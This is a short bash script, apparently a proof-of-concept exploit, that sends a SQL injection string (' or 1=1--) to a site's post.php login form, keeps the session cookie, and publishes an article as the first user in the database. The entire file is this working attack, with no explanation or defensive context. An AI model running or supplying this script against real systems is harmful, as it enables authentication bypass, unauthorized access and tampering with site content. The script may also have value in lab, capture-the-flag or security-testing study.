#!/bin/bash
url="$1";
curl -c cookies.txt -d "username=' or 1=1--&password=&form=login&submit=Login" "$url/post.php";
curl -b cookies.txt -d "title=Hey+guys&content=I+am+a+dead+beef++++++++&type=1&form=content&submit=Post" "$url/post.php";
echo "Use SQL injection login as first user in database and post a article";
